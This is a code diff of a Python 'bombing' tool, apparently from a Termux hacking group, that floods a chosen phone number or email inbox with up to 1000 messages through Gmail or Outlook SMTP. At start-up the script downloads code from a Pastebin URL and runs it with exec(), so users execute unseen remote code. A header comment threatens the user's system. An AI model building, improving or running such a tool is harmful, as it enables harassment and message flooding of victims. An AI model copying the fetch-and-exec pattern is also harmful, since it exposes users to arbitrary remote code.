@@ -1,49 +1,82 @@
 #coding=utf-8
-##BORO VAI TUMI JODI API KHUJTE ASHO TOBE WELCOME 
+#!/bin/python3
+
+
+
 # ASSALAMUALAIKUM
+
 # THIS IS A BANGLADESHI PROGRAMMER
 ##########################################################
-# DEV : EKRAMUL HASSAN
+# DEV : MAO2116
 # Github : https://github.com/mao2116
+
 # IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
-# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL🙂🙂🙂
+
 
 # THANKS TO ALLAH
 # WELCOME HOME
 #####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
 
+
+
+acl='\033[1;30m'
+rcl='\033[1;31m'
+ycl='\033[1;33m'
+ncl='\033[0;00m'
 import os
 try:
     import requests
 except:
-    os.system('pip install requests')
-import json
-import os
-import sys
-import subprocess
-import string
-import random
-import json
-import re
-import time
-import argparse
-from pkg_resources import resource_string 
-from core.user_agents import user_agent
-from core.logos import logomao
-from core.logos import *
+  #TRYING TO DOWNLOAD REQUESTS FOR PYTHON2 AND PYTHON3 BOTH  
+    os.system('pip install requests ; pip2 install requests')
+try:    
+  import json
+  import os
+  import sys
+  import subprocess
+  import string
+  import random
+  import json
+  import re
+  import time
+  import argparse
+  import json
+  import smtplib
+except Exception as emao:
+  exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
+try:
+  from pkg_resources import resource_string
+  from core.user_agents import user_agent
+  from core.logos import logomao
+  from core.logos import *
+  #
+except Exception as emao:
+  maoversys=sys.version_info[0]==3
+  if maoversys:
+    exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
+  else:
+    exit("\n{acl}[ {rcl}! {acl}]{ycl} USE PYTHON 3.6+ {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
+acl='\033[1;30m'
+rcl='\033[1;31m'
+ycl='\033[1;33m'
+ncl='\033[0;00m'
+maoversys=sys.version_info[0]==3
+if maoversys:
+  pass 
+else:
+  exit("\n{acl}[ {rcl}! {acl}]{ycl} USE PYTHON 3.6+ {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
 
-maoversys=int(sys.version_info[0])==3
 
 
-import requests,time,os,requests,sys,random,json ,smtplib
+
 os.system('clear')
 agents = user_agent
 def authermao():
-  os.system('xdg-open https://www.facebook.com/mAoVirUs2116/')
+  os.system('xdg-open https://github.com/mao2116')
 
 
 def autherthbd():
-  os.system('xdg-open https://www.facebook.com/Termux.Hacker.Bd.Official/')
+  os.system('https://www.facebook.com/Termux.Hacker.Bd.Official/')
 def clr():
   os.system("clear")
 
@@ -51,22 +84,14 @@ def logomain2():
   clr()
   print(logomao)
 
-if maoversys:
-  pass 
-else:
-  print('[ ! ] USE PYTHON VERSION 3.6+ [ ! ]')
-  exit()
 try:
     from typing import List
 except ImportError:
     pass #
 STR_TYPE = str
 RUNNING_PYTHON_2=sys.version_info[0]==2
-if RUNNING_PYTHON_2:
-    STR_TYPE = unicode
 import tty, termios
 def getch():
-    # type: () -> str
     fd = sys.stdin.fileno()
     old_settings = termios.tcgetattr(fd)
     try:
@@ -77,16 +102,7 @@ def getch():
     return ch
 
 def MAOPASSWORDSET(prompt='Password: ', mask='*'):
-    # type: (str, str) -> str
-
-    if RUNNING_PYTHON_2:
-        # On Python 2, convert `prompt` and `mask` from str to unicode because sys.stdout.write requires unicode.
-        if isinstance(prompt, str):
-            # Mypy in Python 3 mode (the default mode) will complain about the following line:
-            prompt = prompt.decode('utf-8') # type: ignore
-        if isinstance(mask, str):
-            # Mypy in Python 3 mode (the default mode) will complain about the following line:
-            mask = mask.decode('utf-8') # type: ignore
+  
 
     if not isinstance(prompt, STR_TYPE):
         raise TypeError('prompt argument must be a str, not %s' % (type(prompt).__name__))
@@ -96,7 +112,6 @@ def MAOPASSWORDSET(prompt='Password: ', mask='*'):
         raise ValueError('mask argument must be a zero- or one-character str')
 
     if mask == '' or sys.stdin is not sys.__stdin__:
-        # Fall back on getpass if a mask is not needed.
         import getpass as gp
         return gp.getpass(prompt)
 
@@ -113,19 +128,13 @@ def MAOPASSWORDSET(prompt='Password: ', mask='*'):
             return ''.join(enteredPassword)
         elif key in (8, 127): # Backspace/Del key erases previous output.
             if len(enteredPassword) > 0:
-                # Erases previous character.
-                if RUNNING_PYTHON_2:
-                    sys.stdout.write(STR_TYPE('\b \b')) # \b doesn't erase the character, it just moves the cursor back.
-                else:
-                    sys.stdout.write('\b \b') # \b doesn't erase the character, it just moves the cursor back.
+                sys.stdout.write('\b \b')
+                
                 sys.stdout.flush()
                 enteredPassword = enteredPassword[:-1]
         elif 0 <= key <= 31:
-            # Do nothing for unprintable characters.
-            # TODO: Handle Esc, F1-F12, arrow keys, home, end, insert, del, pgup, pgdn
             pass
         else:
-            # Key is part of the password; display the mask character.
             char = chr(key)
             sys.stdout.write(mask)
             sys.stdout.flush()
@@ -149,7 +158,7 @@ def mao3print(z):
       
 
 def ext():
-  exit(f"\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n")
+  exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
 
 
 
@@ -157,94 +166,115 @@ def ext():
 
 
 def usemail():
-  maouser=input(f"{gcl}YOUR EMAIL{acl}:{ycl} ")
-  maopass=MAOPASSWORDSET(prompt=f"{gcl}EMAIL PASSWORD{acl}:{ycl} ",mask="*")
-  tomao=input(f"{gcl}TO{acl} :{ycl}")
-  headers=(' MAO WANNA FUCK YOU ')
-  subjectmao=input(f'{gcl}SUBJECT {acl}:{ycl}')
-  body=input(f'{gcl}MESSAGE{acl} :{ycl}')
-  threat=int(input(f'{gcl}THREAT {acl}:{ycl}'))
-  maoserver=smtplib.SMTP('smtp.gmail.com',587)
+  osc("clear")
+  print(logomao)
+  try:
+    maouser=input("{gcl}YOUR EMAIL{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl))
+    maopass=MAOPASSWORDSET(prompt="{gcl}EMAIL PASSWORD{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl),mask="*")
+    tomao=input("{gcl}TO{acl} :{ycl}".format(gcl=gcl,acl=acl,ycl=ycl))
+    headers=(' MAO WANNA FUCK YOU ')
+    subjectmao=input('{gcl}SUBJECT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
+    body=input('{gcl}MESSAGE{acl} :{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
+    threat=int(input('{gcl}THREAT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl)))
+  except KeyboardInterrupt:
+    exit("\n{acl}[ {rcl}! {acl}]{ycl} CANCELLED  {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
+  try:
+    
+    maoserver=smtplib.SMTP('smtp.gmail.com',587)
+  except:
+    exit('{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]'.format(rcl=rcl,acl=acl))
   maoserver.starttls()
   try:
     maoserver.login(maouser, maopass)
   except smtplib.SMTPAuthenticationError:
-    print(f"{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS \n OR NEED TO ENABLE LESS SECURE APPS{ncl}")
+    print("{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS \n OR NEED TO ENABLE LESS SECURE APPS{ncl}".format(rcl=rcl,ncl=ncl))
     os.system('xdg-open https://myaccount.google.com/lesssecureapps')
+    exit()
   try:
     i=1
     for i in range(threat):
       i=i+1
       i2=str(i)
-      message=f'Form: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'
+      message='From: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'.format(maouser=maouser,headers=headers,subjectmao=subjectmao,body=body,i2=i2)
       
       maoserver.sendmail(maouser,tomao,message)
       
-      print(f"{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !")
+      print("{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !".format(gcl=gcl,acl=acl,rcl=rcl,i2=i2))
       
   except KeyboardInterrupt:
-    print(f"{acl}[{rcl} !{acl} ] {rcl}CANCELED {acl}[{rcl} !{acl} ]")
+    exit("{acl}[{rcl} !{acl} ] {rcl} ...ABORTING... {acl}[{rcl} !{acl} ]".format(rcl=rcl,acl=acl))
 def usoutmail():
-  maouser=input(f"{gcl}YOUR EMAIL{acl}:{ycl} ")
-  maopass=MAOPASSWORDSET(prompt=f"{gcl}EMAIL PASSWORD{acl}:{ycl} ",mask="*")
-  tomao=input(f"{gcl}TO{acl} :{ycl}")
-  headers=(' MAO WANNA FUCK YOU ')
-  subjectmao=input(f'{gcl}SUBJECT {acl}:{ycl}')
-  body=input(f'{gcl}MESSAGE{acl} :{ycl}')
-  threat=int(input(f'{gcl}THREAT {acl}:{ycl}'))
-  message=f'Form: {maouser}{headers}\nSUBJECT : {subjectmao}\n{body}'
+  osc("clear")
+  print(logomao)
+  try:
+    maouser=input("{gcl}YOUR EMAIL{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl))
+    maopass=MAOPASSWORDSET(prompt="{gcl}EMAIL PASSWORD{acl}:{ycl} ".format(gcl=gcl,acl=acl,ycl=ycl),mask="*")
+    tomao=input("{gcl}TO{acl} :{ycl}".format(gcl=gcl,acl=acl,ycl=ycl))
+    headers=(' MAO WANNA FUCK YOU ')
+    subjectmao=input('{gcl}SUBJECT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
+    body=input('{gcl}MESSAGE{acl} :{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl))
+    threat=int(input('{gcl}THREAT {acl}:{ycl}'.format(gcl=gcl,acl=acl,ycl=ycl)))
+  except KeyboardInterrupt:
+    exit("{acl}[{rcl} !{acl} ] {rcl}CANCELLED {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl,))
+
   try:
     maoserver=smtplib.SMTP('smtp-mail.outlook.com',587)
   except:
-    exit(f'{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]')
+    exit('{acl}[ {rcl}! {acl}]{rcl} YOUR INTERNET CONNECTION IS TOO POOR {acl}[{rcl} !{acl} ]'.format(rcl=rcl,acl=acl))
   maoserver.ehlo()
   maoserver.starttls()
   try:
     maoserver.login(maouser, maopass)
   except smtplib.SMTPAuthenticationError:
-    print(f"{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS.")
+    exit("{rcl}YOUR USERNAME OR PASSWORD IS INCORRECT, PLEASE TRY AGAIN USING THE CORRECT CREDENTIALS.".format(rcl=rcl))
     
   try:
     i=1
     for i in range(threat):
       i=i+1
       i2=str(i)
-      message=f'Form: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'
+      message='From: {maouser}{headers}\nSUBJECT : {subjectmao}.{i2}\n{body}'.format(maouser=maouser,headers=headers,subjectmao=subjectmao,body=body,i2=i2)
       maoserver.sendmail(maouser,tomao,message)
-      print(f"{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !")
+      print("{acl}[ {rcl}{i2} {acl}] {gcl}MASSAGE SENT SUCCESSFULLY !".format(acl=acl,rcl=rcl,i2=i2,gcl=gcl))
   except KeyboardInterrupt:
-    print(f"{acl}[{rcl} !{acl} ] {rcl}CANCELED {acl}[{rcl} !{acl} ]")
+    exit("{acl}[{rcl} !{acl} ] {rcl}...ABORTING... {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl,))
 def maocc1():
-  mao=open("core/cc_codes_mao.json","r")
-  mao=json.load(mao)
-  mao=mao["MAOCC_CODES"]
-  return mao
-print(f"{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ")
-print(f"{gcl}WAIT{bcl}...")
-maopaste=requests.get("https://pastebin.com/raw/vAjQVpWn").text
-exec(maopaste)
+  try:
+    
+    mao=open("core/cc_codes_mao.json","r")
+    mao=json.load(mao)
+    mao=mao["MAOCC_CODES"]
+    return mao
+  except Exception as emao:
+    exit("\n{acl}[ {rcl}FILE ERROR TYPE : {acl}]{ycl}  {emao} {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl,emao=emao))
+print("{gcl}LOADING {bcl}APIS{gcl} FROM ONLINE. ".format(gcl=gcl,bcl=bcl))
+print("{gcl}WAIT{bcl}...".format(gcl=gcl,bcl=bcl))
+try:
+  maopaste=requests.get("https://pastebin.com/raw/vAjQVpWn").text
+  exec(maopaste)
+except:
+  exit("\n{acl}[ {rcl}! {acl}]{ycl} API'S NOT LOADED {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
 def get_phone_info(maocc,maonumber):
    
       try:
         cc =maocc
         if not maocc1().get(cc, False):
-            print("The country code ({cc}) that you have entered"
-                " is invalid or unsupported".format(cc=cc))
+            exit("[ ! ] The COUNTRY CODE ({cc}) THAT YOU HAVE ENTERED IS INVALID OR UNSUPPORTED [ ! ]".format(cc=cc))
         ccn=maocc1().get(cc)
         target=maonumber
         if ((len(target) <= 6) or (len(target) >= 12)):
-            exit("The phone number ({target})".format(target=target) +"that you have entered is invalid\n")
+            exit("[ ! ] THE PHONE NUMBER ({target}) THAT YOU HAVE ENTERED IS INVALID [ ! ]\n".format(target=target))
             
         return (cc, target,ccn)
       except KeyboardInterrupt:
-        exit()
+        exit("\n{acl}[ {rcl}! {acl}]{ycl} THANKS FOR USE THIS TOOL {acl}[ {rcl}!{acl} ]{ncl}\n".format(acl=acl,rcl=rcl,ycl=ycl,ncl=ncl))
 
 def main(): 
 
-    # create parser 
+   
 
-    logomao=f"""
-\033[1;33m {bcl}V.1.{gcl}3{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
+    logomao="""
+\033[1;33m {bcl}V.1.{gcl}4{ycl} _   _ \033[1;36m ____  ____  \033[1;32m   ____   ___  __  __ \033[1;30mTHBD\033[0;00m  
 \033[1;33m|_   _| | | |\033[1;36m| __ )|  _ \ \033[1;32m  | __ ) / _ \|  \/  | __ ) 
 \033[1;33m  | | | |_| |\033[1;36m|  _ \| | | | \033[1;32m |  _ \| | | | |\/| |  _ \ 
 \033[1;33m  | | |  _  |\033[1;36m| |_) | |_| |\033[1;32m  | |_) | |_| | |  | | |_) |
@@ -257,17 +287,17 @@ def main():
                   \033[1;30m[ \033[1;34mAUTHER \033[1;30m] \033[1;32mTERMUX \033[1;32mHACKER\033[1;31m BD
                   \033[1;30m[\033[1;34m GITHUB\033[1;30m ] \033[1;34mMAO2116
                   \033[1;30m[ \033[1;34mCODER  \033[1;30m] \033[1;30mMAO2116 
-\033[0;00m"""
+\033[0;00m""".format(bcl=bcl,gcl=gcl,ycl=ycl)
     print(logomao)
     parser = argparse.ArgumentParser(description="")
 
     #
 
-    # add expected arguments 
+  
 
     parser.add_argument('--bombing', dest='BOMBING', required="store_true",help="ENTER YOUR BOMBING TYPE sms/sms_call/email/outlook")
     
-    #
+ 
     parser.add_argument('--cc', dest='COUNTRY_CODE',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
 
     parser.add_argument('--number', dest='NUMBER',help="ONLY NEED FOR SMS/SMS_CALL BOMBING") 
@@ -282,26 +312,35 @@ def main():
     
     
     args = parser.parse_args() 
-    
+    maothreat=0
     if args.BOMBING=='sms':
-      maothreat=int(args.THREAT)
+      try:
+        maothreat=int(args.THREAT)
+        
+      except:
+        print("[ ! ] ENTER BOMBING THREAT [ ! ] \n")
       if maothreat <=1000:
-        pass
+          pass
       else:
-        exit(f"{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]")
-      
+          exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))
+
       maocc=str(args.COUNTRY_CODE)
       maonumber=str(args.NUMBER)
       get_phone_info(maocc,maonumber)
       ccn=get_phone_info(maocc,maonumber)[2]
       mainbomb(maothreat,maocc,maonumber,ccn)
     elif args.BOMBING=="sms_call":
-      maothreat=int(args.THREAT)
-      if maothreat <=1000:
-        pass
-      else:
-        exit(f"{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]")
+      maothreat =0
+      try:
+        maothreat=int(args.THREAT)
+        
       
+      except:
+        print("{acl}[ {rcl}!{acl} ]{rcl} ENTER BOMBING THREAT {acl}[{rcl} ! {acl}] \n{ncl}".format(acl=acl,rcl=rcl,ncl=ncl))
+      if maothreat <=1000:
+          pass
+      else:
+          exit("{acl}[{rcl} !{acl} ] {rcl}BOMBING LIMIT 1000 {acl}[{rcl} !{acl} ]\n".format(acl=acl,rcl=rcl))  
       maocc=str(args.COUNTRY_CODE)
       maonumber=str(args.NUMBER)
       get_phone_info(maocc,maonumber)
@@ -312,7 +351,9 @@ def main():
     elif args.BOMBING=="outlook":
       usoutmail()
     else:
-      exit(f"{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]")
+      authermao()
+      exit("{acl}[{rcl} !{acl} ] {rcl}TRY WITH CORRECT BOMBING TYPE {acl}[{rcl} !{acl} ]".format(acl=acl,rcl=rcl))
+      
       
       
 
@@ -327,8 +368,10 @@ if __name__ == '__main__':
 # DEV : EKRAMUL HASSAN
 # Github : https://github.com/mao2116
 # IF YOU WANNA TAKE CREADITS FOR THIS TOOL,,,LOOK YOUR SELF AGAIN AND AGAIN,,
-# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL🙂🙂🙂
+# YOU KNOW WHAT I FUCK YOUR SYSTEM SO BE CAREFULL
 
 # THANKS TO ALLAH
 # WELCOME HOME
 #####################৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳৳################
+
+###THIS TOOL IS ONLINE
